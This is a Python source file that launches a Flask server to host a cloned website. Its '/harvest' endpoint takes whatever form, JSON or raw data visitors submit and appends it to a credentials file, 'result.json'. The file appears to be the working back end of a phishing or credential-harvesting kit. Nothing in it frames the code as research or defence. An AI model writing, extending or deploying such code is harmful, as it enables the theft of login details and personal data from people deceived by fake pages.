import os
import sys
import subprocess
import time
import atexit
import signal
import socket

def launch_flask_server(site_root, main_file_rel, site_credentials_dir, port=8080):
    os.makedirs(site_credentials_dir, exist_ok=True)

    server_script = f"""
from flask import Flask, request, send_file, send_from_directory, jsonify, abort, make_response
import os, json, datetime

app = Flask(__name__)
SITE_ROOT = r"{os.path.abspath(site_root)}"
CREDS_DIR = r"{os.path.abspath(site_credentials_dir)}"

def save_credentials(data):
    os.makedirs(CREDS_DIR, exist_ok=True)
    creds_file = os.path.join(CREDS_DIR, "result.json")
    try:
        if os.path.exists(creds_file):
            with open(creds_file, 'r') as f:
                creds = json.load(f)
        else:
            creds = []
    except:
        creds = []
    entry = {{
        "timestamp": str(datetime.datetime.now()),
        "data": data
    }}
    creds.append(entry)
    with open(creds_file, 'w') as f:
        json.dump(creds, f, indent=2)
    return True

@app.route('/')
def index():
    index_path = os.path.join(SITE_ROOT, 'index.html')
    if os.path.isfile(index_path):
        return serve_html_file('index.html')
    # Fallback: first HTML file found
    for root, dirs, files in os.walk(SITE_ROOT):
        for f in files:
            if f.lower().endswith('.html'):
                rel_path = os.path.relpath(os.path.join(root, f), SITE_ROOT)
                return serve_html_file(rel_path)
    return abort(404)

@app.route('/<path:path>')
def serve_any_file(path):
    abs_path = os.path.abspath(os.path.join(SITE_ROOT, path))
    # Prevent directory traversal
    if not abs_path.startswith(SITE_ROOT):
        return abort(403)
    if os.path.isdir(abs_path):
        index_file = os.path.join(abs_path, 'index.html')
        if os.path.isfile(index_file):
            rel_path = os.path.relpath(index_file, SITE_ROOT)
            return serve_html_file(rel_path)
        return abort(404)
    if abs_path.lower().endswith('.html') and os.path.isfile(abs_path):
        rel_path = os.path.relpath(abs_path, SITE_ROOT)
        return serve_html_file(rel_path)
    if os.path.isfile(abs_path):
        return send_from_directory(SITE_ROOT, path)
    return abort(404)

def serve_html_file(relpath):
    abs_path = os.path.join(SITE_ROOT, relpath)
    if not os.path.isfile(abs_path):
        return abort(404)
    response = make_response(send_file(abs_path))
    response.headers["Content-Type"] = "text/html; charset=utf-8"
    response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
    return response

@app.route('/harvest', methods=['POST'])
def harvest():
    try:
        data = request.get_json(silent=True)
        if not data or not isinstance(data, dict) or not data:
            data = request.form.to_dict()
        if (not data or not isinstance(data, dict) or not data) and request.data:
            data = request.data.decode('utf-8', errors='ignore')
        if data and isinstance(data, dict) and data:
            save_credentials(data)
            return jsonify({{"status": "success"}}), 200
        elif isinstance(data, str) and data.strip():
            save_credentials({{"raw": data.strip()}})
            return jsonify({{"status": "raw_saved"}}), 200
        else:
            return jsonify({{"status": "empty"}}), 400
    except Exception as e:
        import traceback
        print("[*] Harvest Exception:", str(e))
        print(traceback.format_exc())
        return jsonify({{"status": "error", "message": str(e)}}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port={port}, debug=False)
"""
    proc = subprocess.Popen(
        [sys.executable, "-c", server_script],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        stdin=subprocess.PIPE
    )

    def cleanup():
        try:
            if proc.poll() is None:
                proc.terminate()
                proc.wait(timeout=1)
        except:
            pass

    atexit.register(cleanup)
    signal.signal(signal.SIGINT, lambda *_: cleanup() or sys.exit(0))

    for _ in range(30):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            if s.connect_ex(('localhost', port)) == 0:
                return proc
        time.sleep(0.3)

    cleanup()
    raise RuntimeError("Flask server failed to start")
